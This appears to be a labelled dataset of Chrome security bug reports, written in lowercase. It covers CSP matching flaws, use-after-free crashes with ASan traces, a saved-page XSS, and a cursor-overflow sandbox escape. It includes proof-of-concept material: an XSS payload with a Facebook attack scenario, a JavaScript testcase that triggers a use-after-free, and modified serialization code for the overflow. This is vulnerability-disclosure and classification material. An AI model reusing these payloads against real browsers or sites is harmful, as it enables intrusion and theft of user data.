csp x.y must match a host that ends with x.y 4.2.2 step 4.6 vulnerability details given a csp header of script-src a.localhost the script script src a.localhost/script.js script should not be loaded csp spec section 4.2.2 step 4.6 states if the first character of the source expressions host-part is an u+002a asterisk character and the remaining characters including the leading u+002e full stop character are not a case insensitive match for the rightmost characters of url-host then return does not match scripts such as script src b.a.localhost/script.js script should be allowed by this policy version chrome version 45.0.2454.85 operating system darwin c101.local 14.5.0 darwin kernel version 14.5.0 wed jul 29 02:26:53 pdt 2015 root xnu-2782.40.9~1/release_x86_64 x86_64 i386 macbookpro11,3 darwin reproduction case see vulnerability details section above	5
csp wildcard source expression should not match data uris vulnerability details a csp policy of script-src incorrectly allows a script using a data uri such as script src data application/javascript console.log inline script ran script to run this should not be allowed as per csp section 4.2.2 step 2 which states if the source expression a consists of a single u+002a asterisk character and urls scheme is not one of blob data filesystem then return does match notice that schemes of blob data and filesystem are not allowed by a wildcard source expression version chrome version 45.0.2454.85 operating system darwin c101.local 14.5.0 darwin kernel version 14.5.0 wed jul 29 02:26:53 pdt 2015 root xnu-2782.40.9~1/release_x86_64 x86_64 i386 macbookpro11,3 darwin reproduction case see vulnerability details section above	5
security heap-use-after-free in blink mutationobserver enqueuemutationrecord vulnerability details the following testcase crashes the latest asan build of chrome as follows 28931==error addresssanitizer heap-use-after-free on address at pc bp sp read of size 4 at thread t0 content_shell 0 in size third_party/webkit/source/wtf/vector.h:693:34 1 in append wtf passrefptr blink mutationrecord third_party/webkit/source/wtf/vector.h:1145 2 in blink mutationobserver enqueuemutationrecord wtf passrefptr blink mutationrecord third_party/webkit/source/core/dom/mutationobserver.cpp:195 3 in blink mutationobserverinterestgroup enqueuemutationrecord wtf passrefptr blink mutationrecord third_party/webkit/source/core/dom/mutationobserverinterestgroup.cpp:82:9 4 in blink childlistmutationaccumulator enqueuemutationrecord third_party/webkit/source/core/dom/childlistmutationscope.cpp:143:5 5 in blink childlistmutationaccumulator leavemutationscope third_party/webkit/source/core/dom/childlistmutationscope.cpp:67:13 6 in blink childlistmutationscope childlistmutationscope third_party/webkit/source/core/dom/childlistmutationscope.h:108:13 7 in blink containernode appendchild wtf passrefptr blink node blink exceptionstate third_party/webkit/source/core/dom/containernode.cpp:776:1 8 in blink node appendchild wtf passrefptr blink node blink exceptionstate third_party/webkit/source/core/dom/node.cpp:482:16 9 in appendchildmethodformainworld mnt/data/b/build/slave/asan_release/build/src/out/release/gen/blink/bindings/core/v8/v8node.cpp:715:39 10 in blink nodev8internal appendchildmethodcallbackformainworld v8 functioncallbackinfo v8 value const mnt/data/b/build/slave/asan_release/build/src/out/release/gen/blink/bindings/core/v8/v8node.cpp:726 11 in v8 internal functioncallbackarguments call void v8 functioncallbackinfo v8 value const v8/src/arguments.cc:33:3 12 in v8 internal maybehandle v8 internal object v8 internal handleapicallhelper false v8 internal isolate v8 internal anonymous namespace builtinarguments v8 internal builtinextraarguments 1 v8/src/builtins.cc:1842:34 13 in builtin_implhandleapicall v8/src/builtins.cc:1865:3 14 in v8 internal builtin_handleapicall int v8 internal object v8 internal isolate v8/src/builtins.cc:1861 15 unknown module 16 unknown module 17 unknown module 18 unknown module 19 unknown module 20 in v8 internal anonymous namespace invoke v8 internal isolate bool v8 internal handle v8 internal object v8 internal handle v8 internal object int v8 internal handle v8 internal object v8 internal handle v8 internal object v8/src/execution.cc:98:13 21 in v8 internal execution call v8 internal isolate v8 internal handle v8 internal object v8 internal handle v8 internal object int v8 internal handle v8 internal object v8/src/execution.cc:167:10 22 in v8 script run v8 local v8 context v8/src/api.cc:1724:23 23 in blink v8scriptrunner runcompiledscript v8 isolate v8 local v8 script blink executioncontext third_party/webkit/source/bindings/core/v8/v8scriptrunner.cpp:393:18 24 in blink scriptcontroller executescriptandreturnvalue v8 local v8 context blink scriptsourcecode const blink accesscontrolstatus double third_party/webkit/source/bindings/core/v8/scriptcontroller.cpp:190:21 25 in blink scriptcontroller evaluatescriptinmainworld blink scriptsourcecode const blink accesscontrolstatus blink scriptcontroller executescriptpolicy double third_party/webkit/source/bindings/core/v8/scriptcontroller.cpp:566:35 26 in blink scriptcontroller executescriptinmainworld blink scriptsourcecode const blink accesscontrolstatus double third_party/webkit/source/bindings/core/v8/scriptcontroller.cpp:539:5 27 in blink scriptloader executescript blink scriptsourcecode const double third_party/webkit/source/core/dom/scriptloader.cpp:403:5 28 in blink scriptloader preparescript wtf textposition const blink scriptloader legacytypesupport third_party/webkit/source/core/dom/scriptloader.cpp:272:14 29 in blink htmlscriptrunner runscript blink element wtf textposition const third_party/webkit/source/core/html/parser/htmlscriptrunner.cpp:353:9 30 in blink htmlscriptrunner execute wtf passrefptr blink element wtf textposition const third_party/webkit/source/core/html/parser/htmlscriptrunner.cpp:215:5 31 in blink htmldocumentparser runscriptsforpausedtreebuilder third_party/webkit/source/core/html/parser/htmldocumentparser.cpp:330:9 32 in blink htmldocumentparser processparsedchunkfrombackgroundparser wtf passownptr blink htmldocumentparser parsedchunk third_party/webkit/source/core/html/parser/htmldocumentparser.cpp:525:13 33 in blink htmldocumentparser pumppendingspeculations third_party/webkit/source/core/html/parser/htmldocumentparser.cpp:586:36 34 in blink htmldocumentparser resumeparsingafteryield third_party/webkit/source/core/html/parser/htmldocumentparser.cpp:319:5 35 in blink cancellabletaskfactory cancellabletask run third_party/webkit/source/platform/scheduler/cancellabletaskfactory.cpp:29:9 36 in run base/bind_internal.h:157:12 37 in makeitso base/bind_internal.h:293 38 in base internal invoker base indexsequence 0ul base internal bindstate base internal runnableadapter void scoped_ptr blink webtaskrunner task base defaultdeleter blink webtaskrunner task void scoped_ptr blink webtaskrunner task base defaultdeleter blink webtaskrunner task base internal typelist base internal passedwrapper scoped_ptr blink webtaskrunner task base defaultdeleter blink webtaskrunner task base internal typelist base internal unwraptraits base internal passedwrapper scoped_ptr blink webtaskrunner task base defaultdeleter blink webtaskrunner task base internal invokehelper false void base internal runnableadapter void scoped_ptr blink webtaskrunner task base defaultdeleter blink webtaskrunner task base internal typelist scoped_ptr blink webtaskrunner task base defaultdeleter blink webtaskrunner task void run base internal bindstatebase base/bind_internal.h:343 39 in run base/callback.h:396:12 40 in base debug taskannotator runtask char const base pendingtask const base/debug/task_annotator.cc:51 41 in scheduler taskqueuemanager processtaskfromworkqueue scheduler internal taskqueueimpl scheduler internal taskqueueimpl task components/scheduler/base/task_queue_manager.cc:357:3 42 in scheduler taskqueuemanager dowork bool components/scheduler/base/task_queue_manager.cc:282:13 43 in run base/bind_internal.h:176:12 44 in makeitso base/bind_internal.h:303 45 in base internal invoker base indexsequence 0ul 1ul base internal bindstate base internal runnableadapter void scheduler taskqueuemanager bool void scheduler taskqueuemanager bool base internal typelist base weakptr scheduler taskqueuemanager bool base internal typelist base internal unwraptraits base weakptr scheduler taskqueuemanager base internal unwraptraits bool base internal invokehelper true void base internal runnableadapter void scheduler taskqueuemanager bool base internal typelist base weakptr scheduler taskqueuemanager const bool const void run base internal bindstatebase base/bind_internal.h:343 46 in run base/callback.h:396:12 47 in base debug taskannotator runtask char const base pendingtask const base/debug/task_annotator.cc:51 48 in base messageloop runtask base pendingtask const base/message_loop/message_loop.cc:481:3 49 in deferorrunpendingtask base/message_loop/message_loop.cc:490:5 50 in base messageloop dowork base/message_loop/message_loop.cc:602 51 in base messagepumpdefault run base messagepump delegate base/message_loop/message_pump_default.cc:32:21 52 in base runloop run base/run_loop.cc:55:3 53 in base messageloop run base/message_loop/message_loop.cc:288:3 54 in content renderermain content mainfunctionparams const content/renderer/renderer_main.cc:211:7 55 in content runzygote content mainfunctionparams const content contentmaindelegate content/app/content_main_runner.cc:302:14 56 in content runnamedprocesstypemain std 1 basic_string char std 1 char_traits char std 1 allocator char const content mainfunctionparams const content contentmaindelegate content/app/content_main_runner.cc:386:12 57 in content contentmainrunnerimpl run content/app/content_main_runner.cc:804:12 58 in content contentmain content contentmainparams const content/app/content_main.cc:19:15 59 in main content/shell/app/shell_main.cc:49:10 60 in libc_start_main build/buildd/glibc-2.21/csu/libc-start.c:289 is located 44 bytes inside of 80-byte region freed by thread t0 content_shell here 0 in interceptor_free home/nils/fuzzer3/runner/asan-linux-release-359663/content_shell 1 in deref third_party/webkit/source/wtf/refcounted.h:172:13 2 in blink v8mutationobserver derefobject blink scriptwrappable mnt/data/b/build/slave/asan_release/build/src/out/release/gen/blink/bindings/core/v8/v8mutationobserver.cpp:180 3 in derefobject third_party/webkit/source/bindings/core/v8/wrappertypeinfo.h:157:13 4 in blink scriptwrappable secondweakcallback v8 weakcallbackinfo blink scriptwrappable const third_party/webkit/source/bindings/core/v8/scriptwrappable.h:211 5 in invoke v8/src/global-handles.cc:967:3 6 in invokesecondpassphantomcallbacks v8/src/global-handles.cc:822 7 in v8 internal globalhandles dispatchpendingphantomcallbacks bool v8/src/global-handles.cc:941 8 in v8 internal globalhandles postgarbagecollectionprocessing v8 internal garbagecollector v8 gccallbackflags v8/src/global-handles.cc:988:18 9 in v8 internal heap performgarbagecollection v8 internal garbagecollector v8 gccallbackflags v8/src/heap/heap.cc:1326:9 10 in v8 internal heap collectgarbage v8 internal garbagecollector char const char const v8 gccallbackflags v8/src/heap/heap.cc:1002:11 11 in collectgarbage v8/src/heap/heap-inl.h:531:10 12 in v8 internal heap collectallgarbage int char const v8 gccallbackflags v8/src/heap/heap.cc:859 13 in v8 isolate requestgarbagecollectionfortesting v8 isolate garbagecollectiontype v8/src/api.cc:7138:5 14 in v8 internal functioncallbackarguments call void v8 functioncallbackinfo v8 value const v8/src/arguments.cc:33:3 15 in v8 internal maybehandle v8 internal object v8 internal handleapicallhelper false v8 internal isolate v8 internal anonymous namespace builtinarguments v8 internal builtinextraarguments 1 v8/src/builtins.cc:1842:34 16 in builtin_implhandleapicall v8/src/builtins.cc:1865:3 17 in v8 internal builtin_handleapicall int v8 internal object v8 internal isolate v8/src/builtins.cc:1861 18 unknown module 19 unknown module 20 unknown module 21 unknown module 22 unknown module 23 in v8 internal anonymous namespace invoke v8 internal isolate bool v8 internal handle v8 internal object v8 internal handle v8 internal object int v8 internal handle v8 internal object v8 internal handle v8 internal object v8/src/execution.cc:98:13 24 in v8 internal execution call v8 internal isolate v8 internal handle v8 internal object v8 internal handle v8 internal object int v8 internal handle v8 internal object v8/src/execution.cc:167:10 25 in v8 script run v8 local v8 context v8/src/api.cc:1724:23 26 in blink v8scriptrunner runcompiledscript v8 isolate v8 local v8 script blink executioncontext third_party/webkit/source/bindings/core/v8/v8scriptrunner.cpp:393:18 27 in blink scriptcontroller executescriptandreturnvalue v8 local v8 context blink scriptsourcecode const blink accesscontrolstatus double third_party/webkit/source/bindings/core/v8/scriptcontroller.cpp:190:21 28 in blink scriptcontroller evaluatescriptinmainworld blink scriptsourcecode const blink accesscontrolstatus blink scriptcontroller executescriptpolicy double third_party/webkit/source/bindings/core/v8/scriptcontroller.cpp:566:35 29 in blink scriptcontroller executescriptinmainworld blink scriptsourcecode const blink accesscontrolstatus double third_party/webkit/source/bindings/core/v8/scriptcontroller.cpp:539:5 30 in blink scriptloader executescript blink scriptsourcecode const double third_party/webkit/source/core/dom/scriptloader.cpp:403:5 31 in blink scriptloader preparescript wtf textposition const blink scriptloader legacytypesupport third_party/webkit/source/core/dom/scriptloader.cpp:272:14 32 in blink scriptloader didnotifysubtreeinsertionstodocument third_party/webkit/source/core/dom/scriptloader.cpp:93:9 33 in blink containernode notifynodeinserted blink node blink containernode childrenchangesource third_party/webkit/source/core/dom/containernode.cpp:828:13 34 in blink containernode updatetreeafterinsertion blink node third_party/webkit/source/core/dom/containernode.cpp:1280:5 35 in blink containernode appendchild wtf passrefptr blink node blink exceptionstate third_party/webkit/source/core/dom/containernode.cpp:771:9 previously allocated by thread t0 content_shell here 0 in interceptor_malloc home/nils/fuzzer3/runner/asan-linux-release-359663/content_shell 1 in partitionallocgenericflags third_party/webkit/source/wtf/partitionalloc.h:738:20 2 in partitionallocgeneric third_party/webkit/source/wtf/partitionalloc.h:762 3 in fastmalloc third_party/webkit/source/wtf/partitions.h:108 4 in operator new third_party/webkit/source/wtf/refcounted.h:166 5 in blink mutationobserver create wtf passownptr blink mutationcallback third_party/webkit/source/core/dom/mutationobserver.cpp:60 6 in blink v8mutationobserver constructorcustom v8 functioncallbackinfo v8 value const third_party/webkit/source/bindings/core/v8/custom/v8mutationobservercustom.cpp:64:53 7 in blink v8mutationobserver constructorcallback v8 functioncallbackinfo v8 value const mnt/data/b/build/slave/asan_release/build/src/out/release/gen/blink/bindings/core/v8/v8mutationobserver.cpp:127:5 8 in v8 internal functioncallbackarguments call void v8 functioncallbackinfo v8 value const v8/src/arguments.cc:33:3 9 in handleapicallhelper true v8/src/builtins.cc:1842:34 10 in builtin_implhandleapicallconstruct v8/src/builtins.cc:1875 11 in v8 internal builtin_handleapicallconstruct int v8 internal object v8 internal isolate v8/src/builtins.cc:1871 12 unknown module 13 unknown module 14 unknown module 15 unknown module 16 unknown module 17 unknown module 18 in v8 internal anonymous namespace invoke v8 internal isolate bool v8 internal handle v8 internal object v8 internal handle v8 internal object int v8 internal handle v8 internal object v8 internal handle v8 internal object v8/src/execution.cc:98:13 19 in v8 internal execution call v8 internal isolate v8 internal handle v8 internal object v8 internal handle v8 internal object int v8 internal handle v8 internal object v8/src/execution.cc:167:10 20 in v8 script run v8 local v8 context v8/src/api.cc:1724:23 21 in blink v8scriptrunner runcompiledscript v8 isolate v8 local v8 script blink executioncontext third_party/webkit/source/bindings/core/v8/v8scriptrunner.cpp:393:18 22 in blink scriptcontroller executescriptandreturnvalue v8 local v8 context blink scriptsourcecode const blink accesscontrolstatus double third_party/webkit/source/bindings/core/v8/scriptcontroller.cpp:190:21 23 in blink scriptcontroller evaluatescriptinmainworld blink scriptsourcecode const blink accesscontrolstatus blink scriptcontroller executescriptpolicy double third_party/webkit/source/bindings/core/v8/scriptcontroller.cpp:566:35 24 in blink scriptcontroller executescriptinmainworld blink scriptsourcecode const blink accesscontrolstatus double third_party/webkit/source/bindings/core/v8/scriptcontroller.cpp:539:5 25 in blink scriptloader executescript blink scriptsourcecode const double third_party/webkit/source/core/dom/scriptloader.cpp:403:5 26 in blink scriptloader preparescript wtf textposition const blink scriptloader legacytypesupport third_party/webkit/source/core/dom/scriptloader.cpp:272:14 27 in blink htmlscriptrunner runscript blink element wtf textposition const third_party/webkit/source/core/html/parser/htmlscriptrunner.cpp:353:9 28 in blink htmlscriptrunner execute wtf passrefptr blink element wtf textposition const third_party/webkit/source/core/html/parser/htmlscriptrunner.cpp:215:5 29 in blink htmldocumentparser runscriptsforpausedtreebuilder third_party/webkit/source/core/html/parser/htmldocumentparser.cpp:330:9 30 in blink htmldocumentparser processparsedchunkfrombackgroundparser wtf passownptr blink htmldocumentparser parsedchunk third_party/webkit/source/core/html/parser/htmldocumentparser.cpp:525:13 31 in blink htmldocumentparser pumppendingspeculations third_party/webkit/source/core/html/parser/htmldocumentparser.cpp:586:36 32 in blink htmldocumentparser resumeparsingafteryield third_party/webkit/source/core/html/parser/htmldocumentparser.cpp:319:5 33 in blink cancellabletaskfactory cancellabletask run third_party/webkit/source/platform/scheduler/cancellabletaskfactory.cpp:29:9 34 in run base/bind_internal.h:157:12 35 in makeitso base/bind_internal.h:293 36 in base internal invoker base indexsequence 0ul base internal bindstate base internal runnableadapter void scoped_ptr blink webtaskrunner task base defaultdeleter blink webtaskrunner task void scoped_ptr blink webtaskrunner task base defaultdeleter blink webtaskrunner task base internal typelist base internal passedwrapper scoped_ptr blink webtaskrunner task base defaultdeleter blink webtaskrunner task base internal typelist base internal unwraptraits base internal passedwrapper scoped_ptr blink webtaskrunner task base defaultdeleter blink webtaskrunner task base internal invokehelper false void base internal runnableadapter void scoped_ptr blink webtaskrunner task base defaultdeleter blink webtaskrunner task base internal typelist scoped_ptr blink webtaskrunner task base defaultdeleter blink webtaskrunner task void run base internal bindstatebase base/bind_internal.h:343 37 in run base/callback.h:396:12 38 in base debug taskannotator runtask char const base pendingtask const base/debug/task_annotator.cc:51 summary addresssanitizer heap-use-after-free third_party/webkit/source/wtf/vector.h:693:34 in size shadow bytes around the buggy address fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00 00 00 fa fa fa fa 00 00 00 00 00 00 00 00 00 fa fa fa fa fa 00 00 00 00 00 00 00 00 00 00 fa fa fa fa fd fd fd fd fd fd fd fd fd fd fa fa fa fa 00 00 00 00 00 00 00 00 00 fa fa fa fa fa 00 00 00 00 00 00 00 00 00 fa fa fa fa fa fd fd fd fd fd fd fd fd fd fd fa fa fa fa fd fd fd fd fd fd fd fd fd fa fa fa fa fa fd fd fd fd fd fd fd fd fd fa fa fa fa fa fd fd fd fd fd fd fd fd fd fa fa fa shadow byte legend one shadow byte represents 8 application bytes addressable 00 partially addressable 01 02 03 04 05 06 07 heap left redzone fa heap right redzone fb freed heap region fd stack left redzone f1 stack mid redzone f2 stack right redzone f3 stack partial redzone f4 stack after return f5 stack use after scope f8 global redzone f9 global init order f6 poisoned by user f7 container overflow fc array cookie ac intra object redzone bb asan internal fe left alloca redzone ca right alloca redzone cb version chrome version asan-linux-release-359663 reproduction case the testcase requires the command line argument js-flags expose-gc script function start o1335=document.createelementns o1442=document.createelementns o1444=document.createelement iframe o1442.appendchild o1444 document.documentelement.appendchild o1442 o1444.appendchild o1335 o1467=document.createelementns o1470=new mutationobserver function o1470.observe o1335 childlist true characterdata true characterdataoldvalue true attributeoldvalue true o1490=document.createelementns o1491=document.createtextnode glob_appendscript_1018 o1490.appendchild o1491 o1467.appendchild o1490 o1335.appendchild o1467 function glob_appendscript_1018 o1470 disconnect delete o1470 gc start script for crashes please include the following additional information type of crash tab	11
security properly escaped href attribute leading to offline xss upon saving a page note this is a split of issue 503217 i previously reported vulnerability details upon saving a page with a crafted anchor tag escaped html characters followed after in the href attribute will render as regular html entities this makes it possible to steal content or csrf tokens by making a victim save and open a page that includes this link version chrome version 45.0.2454.101 m stable 48.0.2533.0 canary operating system windows 10 64 bit reproduction case 1 save this page ctrl s 2 open 3 a popup box will appear link used for this poc quot gt lt script gt alert 0 lt script gt attack scenario i found a way to abuse this behavior on facebook 1 attacker posts share this post save the page and see what happens 2 attacker commented the following link quot gt lt script gt alert 40 thanks document.getelementsbyclassname 40 2dpb 41 0 innertext 41 lt script gt a 3 upon opening the saved page the victim will see a popup box containing thanks followed by his or hers personal name obviously we can steal a lot more interesting stuff other than their name i added some screenshots of the poc in actions poc is not made public	9
security uaf in midihost sandbox escape renderer patch attached consistently repros on my machine but there is a race that must be won in midimanageralsa dispatchsendmididata can be called from ipc there is a acknowledge send send_thread_.message_loop posttask from_here base bind midimanagerclient accumulatemidibytessent base unretained client data.size client is a midihost which is both a midimanagerclient and a browsermessagefilter for a particular renderer process send_thread is a thread that belongs to midimanageralsa which is owned by browsermainloop independent of any renderers this means that its possible for client to be freed its not retained when the corresponding renderprocesshostimpl dies while these tasks are still in the message loop if the race is won i.e the midihost gets freed before the task fires we get a virtual call into midimanagerclient accumulatemidibytessent on a freed this asan report 7760==error addresssanitizer heap-use-after-free on address at pc bp sp read of size 8 at thread t20 chrome_iothread 0 in run base/bind_internal.h:178:12 1 in makeitso base/bind_internal.h:295:5 2 in run base/bind_internal.h:345:12 3 in run base/callback.h:396:12 4 in runtask base/debug/task_annotator.cc:51:3 5 in runtask base/message_loop/message_loop.cc:482:3 6 in deferorrunpendingtask base/message_loop/message_loop.cc:491:5 7 in dowork base/message_loop/message_loop.cc:603:13 8 in run base/message_loop/message_pump_libevent.cc:237:21 9 in runhandler base/message_loop/message_loop.cc:446:3 10 in run base/run_loop.cc:55:3 11 in run base/message_loop/message_loop.cc:289:3 12 in run base/threading/thread.cc:199:3 13 in iothreadrun content/browser/browser_thread_impl.cc:211:3 14 in run content/browser/browser_thread_impl.cc:246:14 15 in threadmain base/threading/thread.cc:251:3 16 in threadfunc base/threading/platform_thread_posix.cc:64:3 17 in start_thread build/buildd/eglibc-2.19/nptl/pthread_create.c:312:0 is located 0 bytes inside of 256-byte region freed by thread t20 chrome_iothread here 0 in operator delete void 1 in midihost content/browser/media/midi_host.cc:62:23 2 in destruct content midihost content/public/browser/browser_thread.h:257:9 3 in ondestruct content/browser/media/midi_host.cc:69:3 4 in destruct content/public/browser/browser_message_filter.h:135:5 5 in release base/memory/ref_counted.h:184:7 6 in release base/memory/ref_counted.h:403:3 7 in scoped_refptr base/memory/ref_counted.h:298:7 8 in maybescopedrefptr base/bind_helpers.h:439:8 9 in bindstate base/bind_internal.h:414:17 10 in destroy base/bind_internal.h:417:5 11 in release base/callback_internal.cc:18:5 12 in release base/memory/ref_counted.h:403:3 13 in scoped_refptr base/memory/ref_counted.h:298:7 14 in callbackbase base/callback_internal.cc:43:1 15 in callback base/callback_forward.h:11:7 16 in pendingtask base/pending_task.cc:34:1 17 in dowork base/message_loop/message_loop.cc:606:5 18 in run base/message_loop/message_pump_libevent.cc:237:21 19 in runhandler base/message_loop/message_loop.cc:446:3 20 in run base/run_loop.cc:55:3 21 in run base/message_loop/message_loop.cc:289:3 22 in run base/threading/thread.cc:199:3 23 in iothreadrun content/browser/browser_thread_impl.cc:211:3 24 in run content/browser/browser_thread_impl.cc:246:14 25 in threadmain base/threading/thread.cc:251:3 26 in threadfunc base/threading/platform_thread_posix.cc:64:3 27 in start_thread build/buildd/eglibc-2.19/nptl/pthread_create.c:312:0 previously allocated by thread t0 chrome here 0 in operator new unsigned long 1 in createmessagefilters content/browser/renderer_host/render_process_host_impl.cc:876:7 2 in init content/browser/renderer_host/render_process_host_impl.cc:699:3 3 in creatependingrenderframehost content/browser/frame_host/render_frame_host_manager.cc:1641:8 4 in updatestatefornavigate content/browser/frame_host/render_frame_host_manager.cc:2393:5 5 in navigate content/browser/frame_host/render_frame_host_manager.cc:388:49 6 in navigatetoentry content/browser/frame_host/navigator_impl.cc:314:7 7 in navigatetopendingentry content/browser/frame_host/navigator_impl.cc:391:10 8 in navigatetopendingentryinternal content/browser/frame_host/navigation_controller_impl.cc:1796:12 9 in navigatetopendingentry content/browser/frame_host/navigation_controller_impl.cc:1773:18 10 in loadentry content/browser/frame_host/navigation_controller_impl.cc:441:3 11 in loadurlwithparams content/browser/frame_host/navigation_controller_impl.cc:806:3 12 in loadurlincontents chrome/browser/ui/browser_navigator.cc:290:3 13 in navigate chrome/browser/ui/browser_navigator.cc:547:9 14 in opentabsinbrowser chrome/browser/ui/startup/startup_browser_creator_impl.cc:774:5 15 in processspecifiedurls chrome/browser/ui/startup/startup_browser_creator_impl.cc:693:22 16 in processstartupurls chrome/browser/ui/startup/startup_browser_creator_impl.cc:629:22 17 in processlaunchurls chrome/browser/ui/startup/startup_browser_creator_impl.cc:515:26 18 in launch chrome/browser/ui/startup/startup_browser_creator_impl.cc:348:5 19 in launchbrowser chrome/browser/ui/startup/startup_browser_creator.cc:383:27 20 in processcmdlineimpl chrome/browser/ui/startup/startup_browser_creator.cc:833:12 21 in start chrome/browser/ui/startup/startup_browser_creator.cc:327:10 22 in premainmessagelooprunimpl chrome/browser/chrome_browser_main.cc:1694:24 23 in premainmessagelooprun chrome/browser/chrome_browser_main.cc:1122:18 24 in premainmessagelooprun content/browser/browser_main_loop.cc:943:5 25 in run base/bind_internal.h:178:12 26 in makeitso base/bind_internal.h:288:12 27 in run base/bind_internal.h:345:12 28 in run base/callback.h:396:12 29 in runalltasksnow content/browser/startup_task_runner.cc:45:14 thread t20 chrome_iothread created by t0 chrome here 0 in interceptor_pthread_create 1 in createthread base/threading/platform_thread_posix.cc:103:13 2 in createwithpriority base/threading/platform_thread_posix.cc:184:10 3 in startwithoptions base/threading/thread.cc:113:10 4 in startwithoptions content/browser/browser_thread_impl.cc:301:10 5 in createthreads content/browser/browser_main_loop.cc:912:12 6 in run base/bind_internal.h:178:12 7 in makeitso base/bind_internal.h:288:12 8 in run base/bind_internal.h:345:12 9 in run base/callback.h:396:12 10 in runalltasksnow content/browser/startup_task_runner.cc:45:14 11 in createstartuptasks content/browser/browser_main_loop.cc:821:3 12 in initialize content/browser/browser_main_runner.cc:220:5 13 in browsermain content/browser/browser_main.cc:40:19 14 in runnamedprocesstypemain content/app/content_main_runner.cc:378:14 15 in run content/app/content_main_runner.cc:786:12 16 in contentmain content/app/content_main.cc:19:15 17 in chromemain chrome/app/chrome_main.cc:66:12 18 in main chrome/app/chrome_exe_main_aura.cc:17:10 19 in libc_start_main build/buildd/eglibc-2.19/csu/libc-start.c:287:0 summary addresssanitizer heap-use-after-free mnt/ssd/chromium/src/out/release/lib/libcontent.so shadow bytes around the buggy address fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd shadow byte legend one shadow byte represents 8 application bytes addressable 00 partially addressable 01 02 03 04 05 06 07 heap left redzone fa heap right redzone fb freed heap region fd stack left redzone f1 stack mid redzone f2 stack right redzone f3 stack partial redzone f4 stack after return f5 stack use after scope f8 global redzone f9 global init order f6 poisoned by user f7 container overflow fc array cookie ac intra object redzone bb asan internal fe left alloca redzone ca right alloca redzone cb 7760==aborting	11
heap-use-after-free in audiooutputdevice when an aod is not authorized it enters ipc_closed state but the ipc is not actually closed if an unauthorized aod is created it remains registered in the audiomessagefilter stop does not deregister the aod from the filter because stop works only when the state is not ipc_closed	11
use-of-uninitialized-value in vp3_h_loop_filter_c detailed report fuzzer inferno_layout_test_unmodified job type linux_msan_chrome crash type use-of-uninitialized-value crash address crash state vp3_h_loop_filter_c apply_loop_filter vp3_decode_frame regressed minimized testcase 138.15 kb filer mbarbella	11
security google chrome privilege escalation from renderer process to browser process there is an overflow in the ui platformcursor webcursor getplatformcursor method in src/content/common/cursors/webcursor_aurax11.cc q=webcursor_aurax11.cc there is the following code bitmap.allocn32pixels custom_size_.width custom_size_.height memcpy bitmap.getaddr32 0 0 custom_data_.data custom_data_.size the bitmap buffer is allocated based on the width and height of the custom_size but the memcpy is performed using the size of the custom_data these values are set during webcursor deserialization in src/content/common/cursors/webcursor.cc in webcursor deserialize custom_size is set from two integers that a deserialized from a message and can be between 0 and 1024 custom_data is set from a vector that is deserialized and can be any size unrelated to the width and height the custom_data is verified not to be smaller than the expected pixel buffer based on the width and height but can be longer getplatformcursor is called indirectly by renderwidgethostimpl onsetcursor which is called in response to a viewhostmsg_setcursor message from the renderer the issue above is in the x11 implementation but it appears also affect other platform-specific implementations other than the windows one which instead reads out of bounds i recommend this issue be fixed by changing the check in webcursor deserialize if size_x size_y 4 data_len return false to if size_x size_y 4 data_len return false to prevent the issue in all platform-specific implementations to reproduce the issue replace webcursor serialize with bool webcursor serialize base pickle pickle const if type webcursorinfo typecustom log warning in serialize\n if pickle writeint type pickle writeint hotspot_.x pickle writeint hotspot_.y pickle writeint 2 pickle writeint 1 pickle writefloat custom_scale return false else if pickle writeint type pickle writeint hotspot_.x pickle writeint hotspot_.y pickle writeint custom_size_.width pickle writeint custom_size_.height pickle writefloat custom_scale return false const char data null if custom_data_.empty data custom_data 0 if pickle writedata data custom_data_.size return false return serializeplatformdata pickle and visit the attached html page with the attached image in the same directory this bug is subject to a 90 day disclosure deadline if 90 days elapse without a broadly available patch then the bug report will automatically become visible to the public	11
tracking bug for internal fixes chrome m47 release 2 critical high	11
security segv on unknown address in offsetheightattributegetter vulnerability details this testcase crashes the latest asan build of chrome as follows asan sigsegv 23243==error addresssanitizer segv on unknown address pc bp sp t0 0 in operator mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/wtf/rawptr.h:119:36 1 in document mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/core/dom/treescope.h:70:0 2 in document mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/core/dom/node.h:476:0 3 in blink element offsetheight mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/core/dom/element.cpp:609:0 4 in offsetheightattributegetter mnt/data/b/build/slave/asan_release/build/src/out/release/gen/blink/bindings/core/v8/v8htmlelement.cpp:495:31 5 in blink htmlelementv8internal offsetheightattributegettercallback v8 functioncallbackinfo v8 value const mnt/data/b/build/slave/asan_release/build/src/out/release/gen/blink/bindings/core/v8/v8htmlelement.cpp:501:0 2 unknown module 3 unknown module 4 unknown module 5 unknown module 6 unknown module 6 in v8 internal invoke bool v8 internal handle v8 internal jsfunction v8 internal handle v8 internal object int v8 internal handle v8 internal object mnt/data/b/build/slave/asan_release/build/src/out/release v8/src/execution.cc:128:9 7 in v8 internal execution call v8 internal isolate v8 internal handle v8 internal object v8 internal handle v8 internal object int v8 internal handle v8 internal object bool mnt/data/b/build/slave/asan_release/build/src/out/release v8/src/execution.cc:179:10 8 in v8 function call v8 local v8 context v8 local v8 value int v8 local v8 value mnt/data/b/build/slave/asan_release/build/src/out/release v8/src/api.cc:4542:11 9 in blink v8scriptrunner callfunction v8 local v8 function blink executioncontext v8 local v8 value int v8 local v8 value v8 isolate mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/bindings/core/v8/v8scriptrunner.cpp:488:40 10 in blink scriptcontroller callfunction blink executioncontext v8 